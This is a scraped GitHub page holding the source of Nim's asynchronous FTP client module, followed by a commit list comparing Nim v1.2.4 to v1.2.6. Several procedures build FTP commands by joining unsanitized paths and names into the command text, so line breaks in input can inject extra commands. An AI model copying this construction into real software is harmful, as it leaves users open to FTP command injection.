Public

* [Notifications](/login?return_to=%2Fnim-lang%2FNim) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fnim-lang%2FNim)
* [Star
   16.8k](/login?return_to=%2Fnim-lang%2FNim)

* [Code](/nim-lang/Nim)
* [Issues
  2k](/nim-lang/Nim/issues)
* [Pull requests
  86](/nim-lang/Nim/pulls)
* [Actions](/nim-lang/Nim/actions)
* [Projects
  2](/nim-lang/Nim/projects)
* [Wiki](/nim-lang/Nim/wiki)
* [Security](/nim-lang/Nim/security)
* [Insights](/nim-lang/Nim/pulse)

Additional navigation options

* [Code](/nim-lang/Nim)
* [Issues](/nim-lang/Nim/issues)
* [Pull requests](/nim-lang/Nim/pulls)
* [Actions](/nim-lang/Nim/actions)
* [Projects](/nim-lang/Nim/projects)
* [Wiki](/nim-lang/Nim/wiki)
* [Security](/nim-lang/Nim/security)
* [Insights](/nim-lang/Nim/pulse)

## Files

 dc5a40f
## Breadcrumbs

1. [Nim](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99)
2. /[lib](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib)
3. /[pure](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure)
/
# asyncftpclient.nim

Copy path Blame  Blame
## Latest commit

## History

[History](/nim-lang/Nim/commits/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure/asyncftpclient.nim)439 lines (380 loc) · 15.3 KB dc5a40f
## Breadcrumbs

1. [Nim](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99)
2. /[lib](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib)
3. /[pure](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure)
/
# asyncftpclient.nim

Top
## File metadata and controls

* Code
* Blame

439 lines (380 loc) · 15.3 KB[Raw](https://github.com/nim-lang/Nim/raw/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure/asyncftpclient.nim)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439### Nim's Runtime Library# (c) Copyright 2015 Dominik Picheta# See the file "copying.txt", included in this# distribution, for details about the copyright.#
## This module implements an asynchronous FTP client. It allows you to connect## to an FTP server and perform operations on it such as for example:#### \* The upload of new files.## \* The removal of existing files.## \* Download of files.## \* Changing of files' permissions.## \* Navigation through the FTP server's directories.#### Connecting to an FTP server## ===========================#### In order to begin any sort of transfer of files you must first## connect to an FTP server. You can do so with the ``connect`` procedure.#### .. code-block::nim## import asyncdispatch, asyncftpclient## proc main() {.async.} =## var ftp = newAsyncFtpClient("example.com", user = "test", pass = "test")## await ftp.connect()## echo("Connected")## waitFor(main())#### A new ``main`` async procedure must be declared to allow the use of the## ``await`` keyword. The connection will complete asynchronously and the## client will be connected after the ``await ftp.connect()`` call.#### Uploading a new file## ====================#### After a connection is made you can use the ``store`` procedure to upload## a new file to the FTP server. Make sure to check you are in the correct## working directory before you do so with the ``pwd`` procedure, you can also## instead specify an absolute path.#### .. code-block::nim## import asyncdispatch, asyncftpclient## proc main() {.async.} =## var ftp = newAsyncFtpClient("example.com", user = "test", pass = "test")## await ftp.connect()## let currentDir = await ftp.pwd()## assert currentDir == "/home/user/"## await ftp.store("file.txt", "file.txt")## echo("File finished uploading")## waitFor(main())#### Checking the progress of a file transfer## ========================================#### The progress of either a file upload or a file download can be checked## by specifying a ``onProgressChanged`` procedure to the ``store`` or## ``retrFile`` procedures.#### .. code-block::nim## import asyncdispatch, asyncftpclient#### proc onProgressChanged(total, progress: BiggestInt,## speed: float): Future[void] =## echo("Uploaded ", progress, " of ", total, " bytes")## echo("Current speed: ", speed, " kb/s")#### proc main() {.async.} =## var ftp = newAsyncFtpClient("example.com", user = "test", pass = "test")## await ftp.connect()## await ftp.store("file.txt", "/home/user/file.txt", onProgressChanged)## echo("File finished uploading")## waitFor(main())
import asyncdispatch, asyncnet, nativesockets, strutils, parseutils, os, timesfrom net import BufferSize
type AsyncFtpClient\* = ref object csock\*: AsyncSocket dsock\*: AsyncSocket user\*, pass\*: string address\*: string port\*: Port jobInProgress\*: bool job\*: FtpJob dsockConnected\*: bool
 FtpJobType\* = enum JRetrText, JRetr, JStore
 FtpJob = ref object prc: proc (ftp: AsyncFtpClient, async: bool): bool {.nimcall, gcsafe.} case typ\*: FtpJobType of JRetrText: lines: string of JRetr, JStore: file: File filename: string total: BiggestInt # In bytes. progress: BiggestInt # In bytes. oneSecond: BiggestInt # Bytes transferred in one second. lastProgressReport: float # Time toStore: string # Data left to upload (Only used with async)
 FtpEventType\* = enum EvTransferProgress, EvLines, EvRetr, EvStore
 FtpEvent\* = object ## Event filename\*: string case typ\*: FtpEventType of EvLines: lines\*: string ## Lines that have been transferred. of EvRetr, EvStore: ## Retr/Store operation finished. nil of EvTransferProgress: bytesTotal\*: BiggestInt ## Bytes total. bytesFinished\*: BiggestInt ## Bytes transferred. speed\*: BiggestInt ## Speed in bytes/s currentJob\*: FtpJobType ## The current job being performed.
 ReplyError\* = object of IOError
 ProgressChangedProc\* = proc (total, progress: BiggestInt, speed: float): Future[void] {.closure, gcsafe.}
const multiLineLimit = 10000
proc expectReply(ftp: AsyncFtpClient): Future[TaintedString] {.async.} = var line = await ftp.csock.recvLine() result = TaintedString(line) var count = 0 while line[3] == '-': ## Multi-line reply. line = await ftp.csock.recvLine() string(result).add("\n" & line) count.inc() if count >= multiLineLimit: raise newException(ReplyError, "Reached maximum multi-line reply count.")
proc send\*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.} = ## Send a message to the server, and wait for a primary reply. ## ``\c\L`` is added for you. ## ## \*\*Note:\*\* The server may return multiple lines of coded replies. await ftp.csock.send(m & "\c\L") return await ftp.expectReply()
proc assertReply(received: TaintedString, expected: varargs[string]) = for i in items(expected): if received.string.startsWith(i): return raise newException(ReplyError, "Expected reply '$1' got: $2" % [expected.join("' or '"), received.string])
proc pasv(ftp: AsyncFtpClient) {.async.} = ## Negotiate a data connection. ftp.dsock = newAsyncSocket()
 var pasvMsg = (await ftp.send("PASV")).string.strip.TaintedString assertReply(pasvMsg, "227") var betweenParens = captureBetween(pasvMsg.string, '(', ')') var nums = betweenParens.split(',') var ip = nums[0 .. ^3] var port = nums[^2 .. ^1] var properPort = port[0].parseInt()\*256+port[1].parseInt() await ftp.dsock.connect(ip.join("."), Port(properPort)) ftp.dsockConnected = true
proc normalizePathSep(path: string): string = return replace(path, '\\', '/')
proc connect\*(ftp: AsyncFtpClient) {.async.} = ## Connect to the FTP server specified by ``ftp``. await ftp.csock.connect(ftp.address, ftp.port)
 var reply = await ftp.expectReply() if string(reply).startsWith("120"): # 120 Service ready in nnn minutes. # We wait until we receive 220. reply = await ftp.expectReply()
 # Handle 220 messages from the server assertReply(reply, "220")
 if ftp.user != "": assertReply(await(ftp.send("USER " & ftp.user)), "230", "331")
 if ftp.pass != "": assertReply(await(ftp.send("PASS " & ftp.pass)), "230")
proc pwd\*(ftp: AsyncFtpClient): Future[TaintedString] {.async.} = ## Returns the current working directory. let wd = await ftp.send("PWD") assertReply wd, "257" return wd.string.captureBetween('"').TaintedString # "
proc cd\*(ftp: AsyncFtpClient, dir: string) {.async.} = ## Changes the current directory on the remote FTP server to ``dir``. assertReply(await(ftp.send("CWD " & dir.normalizePathSep)), "250")
proc cdup\*(ftp: AsyncFtpClient) {.async.} = ## Changes the current directory to the parent of the current directory. assertReply(await(ftp.send("CDUP")), "200")
proc getLines(ftp: AsyncFtpClient): Future[string] {.async.} = ## Downloads text data in ASCII mode result = "" assert ftp.dsockConnected while ftp.dsockConnected: let r = await ftp.dsock.recvLine() if r.string == "": ftp.dsockConnected = false else: result.add(r.string & "\n")
 assertReply(await(ftp.expectReply()), "226")
proc listDirs\*(ftp: AsyncFtpClient, dir = ""): Future[seq[string]] {.async.} = ## Returns a list of filenames in the given directory. If ``dir`` is "", ## the current directory is used. If ``async`` is true, this ## function will return immediately and it will be your job to ## use asyncdispatch's ``poll`` to progress this operation. await ftp.pasv()
 assertReply(await(ftp.send("NLST " & dir.normalizePathSep)), ["125", "150"])
 result = splitLines(await ftp.getLines())
proc fileExists\*(ftp: AsyncFtpClient, file: string): Future[bool] {.async.} = ## Determines whether ``file`` exists. var files = await ftp.listDirs() for f in items(files): if f.normalizePathSep == file.normalizePathSep: return true
proc createDir\*(ftp: AsyncFtpClient, dir: string, recursive = false){.async.} = ## Creates a directory ``dir``. If ``recursive`` is true, the topmost ## subdirectory of ``dir`` will be created first, following the secondmost... ## etc. this allows you to give a full path as the ``dir`` without worrying ## about subdirectories not existing. if not recursive: assertReply(await(ftp.send("MKD " & dir.normalizePathSep)), "257") else: var reply = TaintedString"" var previousDirs = "" for p in split(dir, {os.DirSep, os.AltSep}): if p != "": previousDirs.add(p) reply = await ftp.send("MKD " & previousDirs) previousDirs.add('/') assertReply reply, "257"
proc chmod\*(ftp: AsyncFtpClient, path: string, permissions: set[FilePermission]) {.async.} = ## Changes permission of ``path`` to ``permissions``. var userOctal = 0 var groupOctal = 0 var otherOctal = 0 for i in items(permissions): case i of fpUserExec: userOctal.inc(1) of fpUserWrite: userOctal.inc(2) of fpUserRead: userOctal.inc(4) of fpGroupExec: groupOctal.inc(1) of fpGroupWrite: groupOctal.inc(2) of fpGroupRead: groupOctal.inc(4) of fpOthersExec: otherOctal.inc(1) of fpOthersWrite: otherOctal.inc(2) of fpOthersRead: otherOctal.inc(4)
 var perm = $userOctal & $groupOctal & $otherOctal assertReply(await(ftp.send("SITE CHMOD " & perm & " " & path.normalizePathSep)), "200")
proc list\*(ftp: AsyncFtpClient, dir = ""): Future[string] {.async.} = ## Lists all files in ``dir``. If ``dir`` is ``""``, uses the current ## working directory. await ftp.pasv()
 let reply = await ftp.send("LIST" & " " & dir.normalizePathSep) assertReply(reply, ["125", "150"])
 result = await ftp.getLines()
proc retrText\*(ftp: AsyncFtpClient, file: string): Future[string] {.async.} = ## Retrieves ``file``. File must be ASCII text. await ftp.pasv() let reply = await ftp.send("RETR " & file.normalizePathSep) assertReply(reply, ["125", "150"])
 result = await ftp.getLines()
proc getFile(ftp: AsyncFtpClient, file: File, total: BiggestInt, onProgressChanged: ProgressChangedProc) {.async.} = assert ftp.dsockConnected var progress = 0 var progressInSecond = 0 var countdownFut = sleepAsync(1000) var dataFut = ftp.dsock.recv(BufferSize) while ftp.dsockConnected: await dataFut or countdownFut if countdownFut.finished: asyncCheck onProgressChanged(total, progress, progressInSecond.float) progressInSecond = 0 countdownFut = sleepAsync(1000)
 if dataFut.finished: let data = dataFut.read if data != "": progress.inc(data.len) progressInSecond.inc(data.len) file.write(data) dataFut = ftp.dsock.recv(BufferSize) else: ftp.dsockConnected = false
 assertReply(await(ftp.expectReply()), "226")
proc defaultOnProgressChanged\*(total, progress: BiggestInt, speed: float): Future[void] {.nimcall, gcsafe.} = ## Default FTP ``onProgressChanged`` handler. Does nothing. result = newFuture[void]() #echo(total, " ", progress, " ", speed) result.complete()
proc retrFile\*(ftp: AsyncFtpClient, file, dest: string, onProgressChanged: ProgressChangedProc = defaultOnProgressChanged) {.async.} = ## Downloads ``file`` and saves it to ``dest``. ## The ``EvRetr`` event is passed to the specified ``handleEvent`` function ## when the download is finished. The event's ``filename`` field will be equal ## to ``file``. var destFile = open(dest, mode = fmWrite) await ftp.pasv() var reply = await ftp.send("RETR " & file.normalizePathSep) assertReply reply, ["125", "150"] if {'(', ')'} notin reply.string: raise newException(ReplyError, "Reply has no file size.") var fileSize: BiggestInt if reply.string.captureBetween('(', ')').parseBiggestInt(fileSize) == 0: raise newException(ReplyError, "Reply has no file size.")
 await getFile(ftp, destFile, fileSize, onProgressChanged) destFile.close()
proc doUpload(ftp: AsyncFtpClient, file: File, onProgressChanged: ProgressChangedProc) {.async.} = assert ftp.dsockConnected
 let total = file.getFileSize() var data = newString(4000) var progress = 0 var progressInSecond = 0 var countdownFut = sleepAsync(1000) var sendFut: Future[void] = nil while ftp.dsockConnected: if sendFut == nil or sendFut.finished: # TODO: Async file reading. let len = file.readBuffer(addr(data[0]), 4000) setLen(data, len) if len == 0: # File finished uploading. ftp.dsock.close() ftp.dsockConnected = false
 assertReply(await(ftp.expectReply()), "226") else: progress.inc(len) progressInSecond.inc(len) sendFut = ftp.dsock.send(data)
 if countdownFut.finished: asyncCheck onProgressChanged(total, progress, progressInSecond.float) progressInSecond = 0 countdownFut = sleepAsync(1000)
 await countdownFut or sendFut
proc store\*(ftp: AsyncFtpClient, file, dest: string, onProgressChanged: ProgressChangedProc = defaultOnProgressChanged) {.async.} = ## Uploads ``file`` to ``dest`` on the remote FTP server. Usage of this ## function asynchronously is recommended to view the progress of ## the download. ## The ``EvStore`` event is passed to the specified ``handleEvent`` function ## when the upload is finished, and the ``filename`` field will be ## equal to ``file``. var destFile = open(file) await ftp.pasv()
 let reply = await ftp.send("STOR " & dest.normalizePathSep) assertReply reply, ["125", "150"]
 await doUpload(ftp, destFile, onProgressChanged)
proc rename\*(ftp: AsyncFtpClient, nameFrom: string, nameTo: string) {.async.} = ## Rename a file or directory on the remote FTP Server from current name ## ``name\_from`` to new name ``name\_to`` assertReply(await ftp.send("RNFR " & nameFrom), "350") assertReply(await ftp.send("RNTO " & nameTo), "250")
proc removeFile\*(ftp: AsyncFtpClient, filename: string) {.async.} = ## Delete a file ``filename`` on the remote FTP server assertReply(await ftp.send("DELE " & filename), "250")
proc removeDir\*(ftp: AsyncFtpClient, dir: string) {.async.} = ## Delete a directory ``dir`` on the remote FTP server assertReply(await ftp.send("RMD " & dir), "250")
proc newAsyncFtpClient\*(address: string, port = Port(21), user, pass = ""): AsyncFtpClient = ## Creates a new ``AsyncFtpClient`` object. new result result.user = user result.pass = pass result.address = address result.port = port result.dsockConnected = false result.csock = newAsyncSocket()
when not defined(testing) and isMainModule: var ftp = newAsyncFtpClient("example.com", user = "test", pass = "test") proc main(ftp: AsyncFtpClient) {.async.} = await ftp.connect() echo await ftp.pwd() echo await ftp.listDirs() await ftp.store("payload.jpg", "payload.jpg") await ftp.retrFile("payload.jpg", "payload2.jpg") await ftp.rename("payload.jpg", "payload\_renamed.jpg") await ftp.store("payload.jpg", "payload\_remove.jpg") await ftp.removeFile("payload\_remove.jpg") await ftp.createDir("deleteme") await ftp.removeDir("deleteme") echo("Finished")
 waitFor main(ftp)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_0ef7ade7_20250119_111515.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2FNim%2Fcompare%2Fv1.2.4...v1.2.6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2FNim%2Fcompare%2Fv1.2.4...v1.2.6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcompare%2Fshow&source=header-repo&source_repo=nim-lang%2FNim)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nim-lang](/nim-lang)
/
**[Nim](/nim-lang/Nim)**
Public

* [Notifications](/login?return_to=%2Fnim-lang%2FNim) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fnim-lang%2FNim)
* [Star
   16.8k](/login?return_to=%2Fnim-lang%2FNim)

* [Code](/nim-lang/Nim)
* [Issues
  2k](/nim-lang/Nim/issues)
* [Pull requests
  86](/nim-lang/Nim/pulls)
* [Actions](/nim-lang/Nim/actions)
* [Projects
  2](/nim-lang/Nim/projects)
* [Wiki](/nim-lang/Nim/wiki)
* [Security](/nim-lang/Nim/security)
* [Insights](/nim-lang/Nim/pulse)

Additional navigation options

* [Code](/nim-lang/Nim)
* [Issues](/nim-lang/Nim/issues)
* [Pull requests](/nim-lang/Nim/pulls)
* [Actions](/nim-lang/Nim/actions)
* [Projects](/nim-lang/Nim/projects)
* [Wiki](/nim-lang/Nim/wiki)
* [Security](/nim-lang/Nim/security)
* [Insights](/nim-lang/Nim/pulse)

[Permalink](https://github.com/nim-lang/Nim/compare/nim-lang%3Aba808ba...nim-lang%3Abf320ed)
# Comparing changes

 Choose two branches to see what’s changed or to start a new pull request.
If you need to, you can also  compare across forks
 or
[learn more about diff comparisons](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

# Open a pull request

 Create a new pull request by comparing changes across two branches. If you need to, you can also  compare across forks
.
[Learn more about diff comparisons here](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

*base repository:*
nim-lang/Nim

Failed to load repositories. Confirm that selected base ref is valid, then try again.

 Loading

*base:*
v1.2.4

Choose a base ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/nim-lang/Nim/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v1.2.6)

Could not load tags

Nothing to show

[{{ refName }}
default](/nim-lang/Nim/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v1.2.6)

 Loading

...

*head repository:*
nim-lang/Nim

Failed to load repositories. Confirm that selected head ref is valid, then try again.

 Loading

*compare:*
v1.2.6

Choose a head ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/nim-lang/Nim/compare/v1.2.4...%7B%7B%20urlEncodedRefName%20%7D%7D)

Could not load tags

Nothing to show

[{{ refName }}
default](/nim-lang/Nim/compare/v1.2.4...%7B%7B%20urlEncodedRefName%20%7D%7D)

 Loading

* 20

  commits
* 27

  files changed
* 10

  contributors

### Commits on Jul 21, 2020

1. [SSL\_CTX\_load\_verify\_locations parameters are reversed (](/nim-lang/Nim/commit/4d6cb1ff214374e4e458018d5f92d403dcf04e16)[#14815](https://github.com/nim-lang/Nim/pull/14815)[) [backp…](/nim-lang/Nim/commit/4d6cb1ff214374e4e458018d5f92d403dcf04e16)
    …

   ```
   …ort]

   (cherry picked from commit [d968163](https://github.com/nim-lang/Nim/commit/d968163cd18c70167ff428bcf8c1b5e3dfb2da5b))
   ```

   [![@aguspiza](https://avatars.githubusercontent.com/u/345075?s=40&v=4)](/aguspiza) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [aguspiza](/nim-lang/Nim/commits?author=aguspiza "View all commits by aguspiza")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 21, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/4d6cb1ff214374e4e458018d5f92d403dcf04e16)
   * Copy full SHA for 4d6cb1f
   * [Browse repository at this point](/nim-lang/Nim/tree/4d6cb1ff214374e4e458018d5f92d403dcf04e16)

   Copy the full SHA

    [4d6cb1f](/nim-lang/Nim/commit/4d6cb1ff214374e4e458018d5f92d403dcf04e16)View commit details

   Browse the repository at this point in the history
2. [Fix](/nim-lang/Nim/commit/1b093d7ec7cdd18e56345f4316c278ffaaa2677d) [#14911](https://github.com/nim-lang/Nim/issues/14911) [(](/nim-lang/Nim/commit/1b093d7ec7cdd18e56345f4316c278ffaaa2677d)[#14922](https://github.com/nim-lang/Nim/pull/14922)[) [backport]](/nim-lang/Nim/commit/1b093d7ec7cdd18e56345f4316c278ffaaa2677d)
    …

   ```
   * Fix [#14911](https://github.com/nim-lang/Nim/issues/14911)

   * Add testcase

   * Fix test

   (cherry picked from commit [5bd2da3](https://github.com/nim-lang/Nim/commit/5bd2da3f6461ef4dbcfd1f0c35178fa8fa9b5368))
   ```

   [![@Clyybber](https://avatars.githubusercontent.com/u/14862103?s=40&v=4)](/Clyybber) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [Clyybber](/nim-lang/Nim/commits?author=Clyybber "View all commits by Clyybber")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 21, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/1b093d7ec7cdd18e56345f4316c278ffaaa2677d)
   * Copy full SHA for 1b093d7
   * [Browse repository at this point](/nim-lang/Nim/tree/1b093d7ec7cdd18e56345f4316c278ffaaa2677d)

   Copy the full SHA

    [1b093d7](/nim-lang/Nim/commit/1b093d7ec7cdd18e56345f4316c278ffaaa2677d)View commit details

   Browse the repository at this point in the history
3. [fix](/nim-lang/Nim/commit/27acb43e690d8b8bcd8a3fc0ae37263196f05f85) [#14082](https://github.com/nim-lang/Nim/issues/14082)[, don't crash on incorrectly formatted input (](/nim-lang/Nim/commit/27acb43e690d8b8bcd8a3fc0ae37263196f05f85)[#14977](https://github.com/nim-lang/Nim/pull/14977)[) [back…](/nim-lang/Nim/commit/27acb43e690d8b8bcd8a3fc0ae37263196f05f85)
    …

   ```
   …port]

   (cherry picked from commit [c625130](https://github.com/nim-lang/Nim/commit/c62513049cd7dcbd5b339c2078856a31c498b4aa))
   ```

   [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 21, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/27acb43e690d8b8bcd8a3fc0ae37263196f05f85)
   * Copy full SHA for 27acb43
   * [Browse repository at this point](/nim-lang/Nim/tree/27acb43e690d8b8bcd8a3fc0ae37263196f05f85)

   Copy the full SHA

    [27acb43](/nim-lang/Nim/commit/27acb43e690d8b8bcd8a3fc0ae37263196f05f85)View commit details

   Browse the repository at this point in the history
4. [fix](/nim-lang/Nim/commit/e854d385f59517a9da8fa9b7ed97b76237e9b518) [#9771](https://github.com/nim-lang/Nim/issues/9771) [(](/nim-lang/Nim/commit/e854d385f59517a9da8fa9b7ed97b76237e9b518)[#14357](https://github.com/nim-lang/Nim/pull/14357)[)](/nim-lang/Nim/commit/e854d385f59517a9da8fa9b7ed97b76237e9b518)
    …

   ```
   * fix [#9771](https://github.com/nim-lang/Nim/issues/9771)
   * map SQLLEN SQLULEN
   * fix proc params take TSqlLen

   Co-authored-by: bung87 <crc32@qq.com>
   (cherry picked from commit [ce0552c](https://github.com/nim-lang/Nim/commit/ce0552c1008c8292c550e7a973c580f416c005ca))
   ```

   [![@bung87](https://avatars.githubusercontent.com/u/2238294?s=40&v=4)](/bung87) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [bung87](/nim-lang/Nim/commits?author=bung87 "View all commits by bung87")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 21, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/e854d385f59517a9da8fa9b7ed97b76237e9b518)
   * Copy full SHA for e854d38
   * [Browse repository at this point](/nim-lang/Nim/tree/e854d385f59517a9da8fa9b7ed97b76237e9b518)

   Copy the full SHA

    [e854d38](/nim-lang/Nim/commit/e854d385f59517a9da8fa9b7ed97b76237e9b518)View commit details

   Browse the repository at this point in the history
5. [fix odbc regressions (](/nim-lang/Nim/commit/28bc815d3e91696badf5573effcf7375ee4b92f6)[#15009](https://github.com/nim-lang/Nim/pull/15009)[) [backport]](/nim-lang/Nim/commit/28bc815d3e91696badf5573effcf7375ee4b92f6)
    …

   ```
   * fix odbc regressions

   * make only necessary changes

   (cherry picked from commit [edbbbdf](https://github.com/nim-lang/Nim/commit/edbbbdf1a81440bd1eb221edf8a140799a0bed17))
   ```

   [![@cooldome](https://avatars.githubusercontent.com/u/8496051?s=40&v=4)](/cooldome) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [cooldome](/nim-lang/Nim/commits?author=cooldome "View all commits by cooldome")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 21, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/28bc815d3e91696badf5573effcf7375ee4b92f6)
   * Copy full SHA for 28bc815
   * [Browse repository at this point](/nim-lang/Nim/tree/28bc815d3e91696badf5573effcf7375ee4b92f6)

   Copy the full SHA

    [28bc815](/nim-lang/Nim/commit/28bc815d3e91696badf5573effcf7375ee4b92f6)View commit details

   Browse the repository at this point in the history
6. [[Backport] Fixes callbacks being dropped on Linux/macOS/BSD. (](/nim-lang/Nim/commit/ddcbc1a58f82b9e3931e3ef5d1a8b4337ba50ccf)[#15012](https://github.com/nim-lang/Nim/pull/15012)[)](/nim-lang/Nim/commit/ddcbc1a58f82b9e3931e3ef5d1a8b4337ba50ccf)
    …

   ```
   Fixes [#15003](https://github.com/nim-lang/Nim/issues/15003).

   This is a serious bug which occurs when data cannot be read/sent
   immediately and there are a bunch of other read/write events
   pending. What happens is that the new events are dropped which
   results in the case of the reported bug resulted in some data not
   being sent (!).

   (cherry picked from commit [1e3a0ef](https://github.com/nim-lang/Nim/commit/1e3a0ef1e1983f2e493f8f42afbb0ae3fbc4fd11))
   ```

   [![@dom96](https://avatars.githubusercontent.com/u/246651?s=40&v=4)](/dom96) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [dom96](/nim-lang/Nim/commits?author=dom96 "View all commits by dom96")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 21, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/ddcbc1a58f82b9e3931e3ef5d1a8b4337ba50ccf)
   * Copy full SHA for ddcbc1a
